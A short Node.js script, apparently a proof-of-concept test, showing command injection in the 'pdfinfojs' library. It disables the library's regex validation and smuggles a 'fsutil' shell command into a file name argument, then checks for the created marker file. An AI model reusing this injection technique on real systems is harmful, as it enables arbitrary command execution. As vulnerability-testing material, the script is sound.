RegExp.prototype.test = () => false;
const pdfinfo = require('pdfinfojs');
const fs = require('fs');
const path = './pdfinfojs';
try {
    if (fs.existsSync(path)) {
        fs.unlinkSync(path);
    }
} catch (err) {
    console.error(err);
}
file_exist = fs.existsSync(path);
console.log('{ ' + file_exist + ', ' + false + ' }');
pdf = new pdfinfo('" & fsutil file createnew pdfinfojs 0');
pdf.getInfo(function (err, info, params) {
    file_exist = fs.existsSync(path);
    console.log('{ ' + file_exist + ', ' + true + ' }');
    fs.unlink(path, function (err) {
    });
});